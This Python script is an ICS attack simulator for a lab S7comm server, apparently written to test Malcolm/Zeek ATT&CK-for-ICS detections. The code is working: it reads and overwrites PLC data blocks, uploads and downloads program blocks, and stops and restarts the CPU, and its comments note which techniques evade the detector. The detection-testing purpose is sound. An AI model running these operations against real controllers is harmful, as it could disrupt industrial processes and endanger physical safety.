"""S7Comm ICS attack simulator — triggers Malcolm ACID ATT&CK for ICS detections
and the S7comm-native Zeek dashboards (device identification / SZL / upload-download).

This script requires:
  1. s7comm-server VM deployed and reachable at the target IP (default 192.168.20.10)
  2. python-snap7 installed: pip install python-snap7

Without an active S7 server the TCP handshake will fail and nothing else runs.

Each technique below runs in its OWN separate TCP connection. This isn't just
defensive style — it's required. Confirmed live 2026-07-04: Malcolm's bundled
S7comm Zeek analyzer stops producing s7comm.log entries for the REST of a
connection after certain message types (SZL reads, and separately, block
upload/download), even though the TCP session itself completes normally
(conn.log shows a clean SF close with a full packet count — this is a Zeek
parser-sync issue, not a network or server problem). Basic Read/Write Variable
messages coexist fine in one connection, but mixing them with SZL or
upload/download risked losing everything after the first "unusual" message.
One connection per technique means a parser desync in one technique's
connection can no longer swallow the others.

Confirmed live against the deployed s7comm-server (2026-07-04):
  T0801 — Monitor Process State (db_read) — works, real DB1 read
  T0845 — Program Upload (upload) — snap7 sends real START_UPLOAD/UPLOAD/END_UPLOAD
  T0843 — Program Download (download) — snap7 sends real REQUEST_DOWNLOAD/
    DOWNLOAD_BLOCK/DOWNLOAD_ENDED
  Handshake — fires on any connection at the Zeek/protocol level; Malcolm's ACID
    package had a plural/singular string bug that prevented it from ever tagging this
    — patched on malcolm-1 2026-07-04 (mDOTS_config_change), confirmed firing live.
  T0836 — Modify Parameter: a plain db_write is function code 0x05 "Write Variable",
    NOT the 0x01/subfunc 0x08 "Modify Variable" ACID's table requires — writing here
    exercises real S7 write traffic but should NOT be expected to trigger ACID's T0836.
  T0858 — Change Operating Mode: confirmed from snap7's own source that plc_stop()/
    plc_hot_start() send function codes 0x29/0x28, not the 0x00 "Push: Mode-Transition"
    ACID's table requires — kept here for the real CPU state change demo value, but
    not expected to populate the ACID panel.

  Device identification recon (read_szl / get_cpu_info / get_order_code) — a
  read_szl(0x001C, 0) response gets logged by Zeek with return_code "Object does
  not exist" (0x0a); Zeek stops parsing anything else in that connection right
  after. Kept in its own connection so this can't affect the other techniques —
  do NOT assume the "S7comm Devices" panel is reliably populated even so; it
  depends on whether Zeek can parse this specific SZL exchange at all, which it
  could not in the run that found this.

Usage:
    python3 s7comm_attack.py --target 192.168.20.10
    python3 s7comm_attack.py --target 192.168.20.10 --rack 0 --slot 1
"""

from __future__ import annotations

import argparse
import logging
import time
from typing import Callable

log = logging.getLogger("s7comm_attack")

# Matches the deployed s7comm-server's registered DB1 size exactly (s7_logic.py
# DB_SIZE=10) — a larger read/write is silently accepted on read but REJECTED by
# the real server on write with "Error on service processing" (confirmed live
# 2026-07-04), since it falls outside the registered memory area.
DB_NUMBER = 1
DB_SIZE = 10


def run_isolated(label: str, host: str, rack: int, slot: int, fn: Callable) -> None:
    """Run one technique in its own fresh connection so a parser desync or
    connection-ending error in one technique can't swallow the others."""
    from snap7 import client as snap7_client

    c = snap7_client.Client()
    try:
        c.connect(host, rack, slot)
    except Exception as exc:
        log.error("%s: connection FAILED — %s", label, exc)
        return
    try:
        fn(c)
    except Exception as exc:
        log.error("%s: FAILED — %s", label, exc)
    finally:
        c.disconnect()


def attack(host: str, rack: int, slot: int) -> None:
    try:
        import snap7  # noqa: F401  (import check only)
    except ImportError:
        log.error("python-snap7 not installed. Run: pip install python-snap7")
        raise SystemExit(1)

    def monitor_process_state(c) -> None:
        log.info("[Handshake + T0801] Monitor Process State — reading DB%d (%d bytes)", DB_NUMBER, DB_SIZE)
        data = c.db_read(DB_NUMBER, 0, DB_SIZE)
        log.info("DB%d read: %s", DB_NUMBER, data.hex())

    def program_upload(c) -> None:
        log.info("[Handshake + T0845] Program Upload — uploading DB%d block from PLC", DB_NUMBER)
        block = c.upload(DB_NUMBER)
        log.info("Uploaded block: %s", block.hex())

    def program_download(c) -> None:
        log.info("[Handshake + T0843] Program Download — downloading DB%d block to PLC", DB_NUMBER)
        data = c.db_read(DB_NUMBER, 0, DB_SIZE)
        c.download(data, DB_NUMBER)

    def modify_parameter(c) -> None:
        log.info("[Handshake + T0836] Modify Parameter — writing modified value to DB%d[0]", DB_NUMBER)
        data = c.db_read(DB_NUMBER, 0, DB_SIZE)
        data[0] = (data[0] ^ 0xFF) & 0xFF
        c.db_write(DB_NUMBER, 0, data)

    def change_operating_mode(c) -> None:
        log.info("[Handshake + T0858] Change Operating Mode — STOP CPU")
        c.plc_stop()
        time.sleep(2)
        log.info("[Handshake + T0858] Change Operating Mode — HOT START CPU")
        c.plc_hot_start()
        time.sleep(2)

    def device_identification(c) -> None:
        log.info("[Handshake + Recon] Device identification — read_szl, get_cpu_info, get_order_code")
        szl = c.read_szl(0x001C, 0)
        # snap7 3.0.0's own S7SZL.__str__ references a nonexistent attribute
        # (self.S7SZHeader instead of self.Header) and crashes the logging
        # formatter — log the real fields directly instead of the object repr.
        log.info("SZL 0x001C (Module Identification): %s", szl.Header)
        cpu_info = c.get_cpu_info()
        log.info("CPU info: %s", cpu_info)
        order_code = c.get_order_code()
        log.info(
            "Order code: %s v%d.%d.%d",
            bytes(order_code.OrderCode).rstrip(b"\x00"),
            order_code.V1,
            order_code.V2,
            order_code.V3,
        )

    steps = [
        ("T0801 Monitor Process State", monitor_process_state),
        ("T0845 Program Upload", program_upload),
        ("T0843 Program Download", program_download),
        ("T0836 Modify Parameter", modify_parameter),
        ("T0858 Change Operating Mode", change_operating_mode),
        ("Device identification recon", device_identification),
    ]
    for label, fn in steps:
        run_isolated(label, host, rack, slot, fn)

    log.info("Attack sequence complete.")


def main() -> None:
    parser = argparse.ArgumentParser(description="S7Comm ACID/ATT&CK ICS attack simulator")
    parser.add_argument("--target", required=True, help="S7 server IP (e.g. 192.168.20.10)")
    parser.add_argument("--rack", type=int, default=0, help="PLC rack number (default: 0)")
    parser.add_argument("--slot", type=int, default=1, help="PLC slot number (default: 1)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    attack(args.target, args.rack, args.slot)


if __name__ == "__main__":
    main()
